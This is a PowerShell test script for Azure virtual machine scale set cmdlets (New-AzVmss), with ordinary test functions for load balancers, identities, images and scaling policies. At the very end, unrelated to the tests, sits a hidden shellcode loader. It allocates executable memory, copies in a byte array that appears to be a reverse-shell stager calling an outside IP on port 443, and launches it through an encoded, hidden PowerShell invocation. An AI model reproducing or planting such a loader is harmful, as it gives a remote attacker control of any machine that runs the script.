














function Test-SimpleNewVmss
{
    
    $vmssname = Get-ResourceName

    try
    {
        $lbName = $vmssname + "LoadBalancer"
        $username = "admin01"
        $password = Get-PasswordForVM | ConvertTo-SecureString -AsPlainText -Force
        $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
        [string]$domainNameLabel = "$vmssname$vmssname".tolower();

        
        $x = New-AzVmss -Name $vmssname -Credential $cred -DomainNameLabel $domainNameLabel -LoadBalancerName $lbName

        Assert-AreEqual $vmssname $x.Name;
        Assert-AreEqual $vmssname $x.ResourceGroupName;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].Name;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Name;
        Assert-False { $x.VirtualMachineProfile.AdditionalCapabilities.UltraSSDEnabled };
        Assert-AreEqual "Standard_DS1_v2" $x.Sku.Name
        Assert-AreEqual $username $x.VirtualMachineProfile.OsProfile.AdminUsername
        Assert-AreEqual "2016-Datacenter" $x.VirtualMachineProfile.StorageProfile.ImageReference.Sku
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].LoadBalancerBackendAddressPools;
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Subnet
        Assert-False { $x.SinglePlacementGroup }
        Assert-Null $x.Identity  

        $lb = Get-AzLoadBalancer -Name $lbName -ResourceGroupName $vmssname 
        Assert-NotNull $lb
        Assert-AreEqual $lbName $lb.Name
    }
    finally
    {
        
        Clean-ResourceGroup $vmssname
    }
}


function Test-SimpleNewVmssFromSIGImage
{
    
    
    
    
    
    
    $vmssname = Get-ResourceName

    try
    {
        $lbName = $vmssname + "LoadBalancer"
        $username = "admin01"
        $password = Get-PasswordForVM | ConvertTo-SecureString -AsPlainText -Force
        $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
        [string]$domainNameLabel = "$vmssname$vmssname".tolower();

        
        $x = New-AzVmss -Name $vmssname -Credential $cred -DomainNameLabel $domainNameLabel -LoadBalancerName $lbName -Location "East US 2" -VmSize "Standard_D2s_v3" -ImageName "/subscriptions/9e223dbe-3399-4e19-88eb-0975f02ac87f/resourceGroups/SIGTestGroupoDoNotDelete/providers/Microsoft.Compute/galleries/SIGTestGalleryDoNotDelete/images/SIGTestImageWindowsDoNotDelete" 

        Assert-AreEqual $vmssname $x.Name;
        Assert-AreEqual $vmssname $x.ResourceGroupName;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].Name;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Name;
        Assert-False { $x.VirtualMachineProfile.AdditionalCapabilities.UltraSSDEnabled };
        Assert-AreEqual "Standard_D2s_v3" $x.Sku.Name
        Assert-AreEqual $username $x.VirtualMachineProfile.OsProfile.AdminUsername
        Assert-AreEqual "/subscriptions/9e223dbe-3399-4e19-88eb-0975f02ac87f/resourceGroups/SIGTestGroupoDoNotDelete/providers/Microsoft.Compute/galleries/SIGTestGalleryDoNotDelete/images/SIGTestImageWindowsDoNotDelete" $x.VirtualMachineProfile.StorageProfile.ImageReference.Id
        Assert-Null $x.VirtualMachineProfile.StorageProfile.ImageReference.Sku
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].LoadBalancerBackendAddressPools;
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Subnet
        Assert-False { $x.SinglePlacementGroup }
        Assert-Null $x.Identity  

        $lb = Get-AzLoadBalancer -Name $lbName -ResourceGroupName $vmssname 
        Assert-NotNull $lb
        Assert-AreEqual $lbName $lb.Name
    }
    finally
    {
        
        Clean-ResourceGroup $vmssname
    }
}


function Test-SimpleNewVmssWithUltraSSD
{
    
    $vmssname = Get-ResourceName

    try
    {
        $lbName = $vmssname + "LoadBalancer"
        $username = "admin01"
        $password = Get-PasswordForVM | ConvertTo-SecureString -AsPlainText -Force
        $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
        [string]$domainNameLabel = "$vmssname$vmssname".tolower();

        
        
        
        
        $x = New-AzVmss -Name $vmssname -Credential $cred -DomainNameLabel $domainNameLabel -LoadBalancerName $lbName -Location "east us 2" -EnableUltraSSD -Zone 3 -VmSize "Standard_D2s_v3"

        Assert-AreEqual $vmssname $x.Name;
        Assert-AreEqual $vmssname $x.ResourceGroupName;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].Name;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Name;
        Assert-True { $x.AdditionalCapabilities.UltraSSDEnabled };
        Assert-AreEqual "Standard_D2s_v3" $x.Sku.Name
        Assert-AreEqual $username $x.VirtualMachineProfile.OsProfile.AdminUsername
        Assert-AreEqual "2016-Datacenter" $x.VirtualMachineProfile.StorageProfile.ImageReference.Sku
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].LoadBalancerBackendAddressPools;
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Subnet
        Assert-False { $x.SinglePlacementGroup }
        Assert-Null $x.Identity  

        $lb = Get-AzLoadBalancer -Name $lbName -ResourceGroupName $vmssname 
        Assert-NotNull $lb
        Assert-AreEqual $lbName $lb.Name
    }
    finally
    {
        
        Clean-ResourceGroup $vmssname
    }
}


function Test-SimpleNewVmssLbErrorScenario
{
    
    $vmssname = Get-ResourceName

    try
    {
        $lbName = $vmssname
        $username = "admin01"
        $password = Get-PasswordForVM | ConvertTo-SecureString -AsPlainText -Force
        $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
        [string]$domainNameLabel = "$vmssname$vmssname".tolower();

        $x = New-AzVmss -Name $vmssname -Credential $cred -DomainNameLabel $domainNameLabel

        Assert-AreEqual $vmssname $x.Name;
        $lb = Get-AzLoadBalancer -Name $vmssname -ResourceGroupName $vmssname 
        Remove-AzVmss -Name $vmssname -ResourceGroupName $vmssname -Force

        $exceptionFound = $false
        $errorMessageMatched = $false

        try
        {
            $newVmssName = $vmssname + "New"
            $x = New-AzVmss -Name $newVmssName -Credential $cred -DomainNameLabel $domainNameLabel -ResourceGroupName $vmssname -LoadBalancerName $lbName
        }
        catch
        {
            $errorMessage = $_.Exception.Message
            $exceptionFound = ( $errorMessage -clike "Existing loadbalancer config is not compatible with what is required by the cmdlet*" )
            $rId = $lb.ResourceId
            $errorMessageMatched = ( $errorMessage -like "*$rId*" )
        }

        Assert-True { $exceptionFound }
        Assert-True { $errorMessageMatched }
    }
    finally
    {
        
        Clean-ResourceGroup $vmssname
    }
}

function Test-SimpleNewVmssWithSystemAssignedIdentity
{
    
    $vmssname = Get-ResourceName

    try
    {
        $username = "admin01"
        $password = Get-PasswordForVM | ConvertTo-SecureString -AsPlainText -Force
        $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
        [string]$domainNameLabel = "$vmssname$vmssname".tolower();

        
        $x = New-AzVmss -Name $vmssname -Credential $cred -DomainNameLabel $domainNameLabel -SystemAssignedIdentity -SinglePlacementGroup

        Assert-AreEqual $vmssname $x.Name;
        Assert-AreEqual $vmssname $x.ResourceGroupName;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].Name;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Name;
        Assert-AreEqual "Standard_DS1_v2" $x.Sku.Name
        Assert-AreEqual $username $x.VirtualMachineProfile.OsProfile.AdminUsername
        Assert-AreEqual "2016-Datacenter" $x.VirtualMachineProfile.StorageProfile.ImageReference.Sku
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].LoadBalancerBackendAddressPools;
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Subnet
        Assert-AreEqual "SystemAssigned" $x.Identity.Type     
        Assert-NotNull  $x.Identity.PrincipalId
        Assert-NotNull  $x.Identity.TenantId
        Assert-True { $x.SinglePlacementGroup }
        Assert-Null $x.Identity.IdentityIds  
    }
    finally
    {
        
        Clean-ResourceGroup $vmssname
    }
}

function Test-SimpleNewVmssWithsystemAssignedUserAssignedIdentity
{
    
    $vmssname = "UAITG123456"

    try
    {
        $username = "admin01"
        $password = Get-PasswordForVM | ConvertTo-SecureString -AsPlainText -Force
        $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
        [string]$domainNameLabel = "$vmssname$vmssname".tolower();

        
        
        
        
        
        
        
        
        
        

        
        
        $newUserId = "/subscriptions/24fb23e3-6ba3-41f0-9b6e-e41131d5d61e/resourcegroups/UAITG123456/providers/Microsoft.ManagedIdentity/userAssignedIdentities/UAITG123456Identity"

        
        $x = New-AzVmss -Name $vmssname -Credential $cred -DomainNameLabel $domainNameLabel -UserAssignedIdentity $newUserId -SystemAssignedIdentity -SinglePlacementGroup

        Assert-AreEqual $vmssname $x.Name;
        Assert-AreEqual $vmssname $x.ResourceGroupName;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].Name;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Name;
        Assert-AreEqual "Standard_DS1_v2" $x.Sku.Name
        Assert-AreEqual $username $x.VirtualMachineProfile.OsProfile.AdminUsername
        Assert-AreEqual "2016-Datacenter" $x.VirtualMachineProfile.StorageProfile.ImageReference.Sku
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].LoadBalancerBackendAddressPools;
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Subnet
        Assert-AreEqual "UserAssigned" $x.Identity.Type     
        Assert-NotNull  $x.Identity.PrincipalId
        Assert-NotNull  $x.Identity.TenantId
        Assert-NotNull $x.Identity.UserAssignedIdentities
        Assert-AreEqual 1 $x.Identity.UserAssignedIdentities.Count
        Assert-True { $x.Identity.UserAssignedIdentities.ContainsKey($newUserId) }
        Assert-NotNull $x.Identity.UserAssignedIdentities[$newUserId].PrincipalId
        Assert-NotNull $x.Identity.UserAssignedIdentities[$newUserId].ClientId
        Assert-True { $x.SinglePlacementGroup }
    }
    finally
    {
        
        Clean-ResourceGroup $vmssname
    }
}


function Test-SimpleNewVmssImageName
{
    
    $vmssname = Get-ResourceName

    try
    {
        $username = "admin01"
        $password = Get-PasswordForVM | ConvertTo-SecureString -AsPlainText -Force
        $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
        [string]$domainNameLabel = "$vmssname$vmssname".tolower();

        
        $x = New-AzVmss `
            -Name $vmssname `
            -Credential $cred `
            -DomainNameLabel $domainNameLabel `
            -SinglePlacementGroup `
            -ImageName "MicrosoftWindowsServer:WindowsServer:2016-Datacenter:latest"

        Assert-AreEqual $vmssname $x.Name;
        Assert-AreEqual $vmssname $x.ResourceGroupName;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].Name;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Name;
        Assert-AreEqual "Standard_DS1_v2" $x.Sku.Name
        Assert-AreEqual $username $x.VirtualMachineProfile.OsProfile.AdminUsername
        Assert-AreEqual "2016-Datacenter" $x.VirtualMachineProfile.StorageProfile.ImageReference.Sku
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].LoadBalancerBackendAddressPools;
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Subnet
        Assert-True { $x.SinglePlacementGroup }
    }
    finally
    {
        
        Clean-ResourceGroup $vmssname
    }
}

function Test-SimpleNewVmssWithoutDomainName
{
    
    $vmssname = Get-ResourceName

    try
    {
        $username = "admin01"
        $password = Get-PasswordForVM | ConvertTo-SecureString -AsPlainText -Force
        $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password

        
        $x = New-AzVmss -Name $vmssname -Credential $cred -SinglePlacementGroup

        Assert-AreEqual $vmssname $x.Name;
        Assert-AreEqual $vmssname $x.ResourceGroupName;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].Name;
        Assert-AreEqual $vmssname $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Name;
        Assert-AreEqual "Standard_DS1_v2" $x.Sku.Name
        Assert-AreEqual $username $x.VirtualMachineProfile.OsProfile.AdminUsername
        Assert-AreEqual "2016-Datacenter" $x.VirtualMachineProfile.StorageProfile.ImageReference.Sku
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].LoadBalancerBackendAddressPools;
        Assert-NotNull $x.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Subnet
        Assert-True { $x.SinglePlacementGroup }
    }
    finally
    {
        
        Clean-ResourceGroup $vmssname
    }
}


function Test-SimpleNewVmssPpg
{
    
    $rgname = Get-ResourceName

    try
    {
        $vmssname = "MyVmss"
        $ppgname = "MyPpg"
        $lbName = $vmssname + "LoadBalancer"
        $username = "admin01"
        $password = Get-PasswordForVM | ConvertTo-SecureString -AsPlainText -Force
        $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
        [string]$domainNameLabel = "$vmssname$vmssname".tolower();

        
        $rg = New-AzResourceGroup -Name $rgname -Location "eastus"
        $ppg = New-AzProximityPlacementGroup `
            -ResourceGroupName $rgname `
            -Name $ppgname `
            -Location "eastus"
        $vmss = New-AzVmss -Name $vmssname -ResourceGroup $rgname -Credential $cred -DomainNameLabel $domainNameLabel -LoadBalancerName $lbName -ProximityPlacementGroup $ppgname

        Assert-AreEqual $vmss.ProximityPlacementGroup.Id $ppg.Id
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-SimpleNewVmssBilling
{
    
    $vmssname = Get-ResourceName

    try
    {
        $username = "admin01"
        $password = Get-PasswordForVM | ConvertTo-SecureString -AsPlainText -Force
        $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
        [string]$domainNameLabel = "$vmssname$vmssname".tolower();

        
        $x = New-AzVmss -Name $vmssname -Location "westus2" -Credential $cred -DomainNameLabel $domainNameLabel `
                        -EvictionPolicy 'Deallocate' -Priority 'Low' -MaxPrice 0.2;
    }
    catch
    {
        Assert-True { $Error[0].ToString().Contains("OS provisioning failure"); }
    }
    finally
    {
        
        Clean-ResourceGroup $vmssname
    }
}


function Test-SimpleNewVmssScaleInPolicy
{
    
    $vmssname = Get-ResourceName

    try
    {
        $username = "admin01"
        $password = Get-PasswordForVM | ConvertTo-SecureString -AsPlainText -Force
        $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
        [string]$domainNameLabel = "$vmssname$vmssname".tolower();

        
        New-AzVmss -Name $vmssname -Location "westus2" -Credential $cred -DomainNameLabel $domainNameLabel `
                   -ScaleInPolicy 'Default';
        $vm = Get-AzVmss -ResourceGroupName $vmssname -Name $vmssname;
        Assert-AreEqual "Default" $vm.ScaleInPolicy.Rules;
    }
    catch
    {
        Assert-True { $Error[0].ToString().Contains("OS provisioning failure"); }
        $vm = Get-AzVmss -ResourceGroupName $vmssname -Name $vmssname;
        Assert-AreEqual "Default" $vm.ScaleInPolicy.Rules;
    }
    finally
    {
        
        Clean-ResourceGroup $vmssname
    }
}

$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbe,0x2b,0xaa,0xd1,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $e"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $e";}

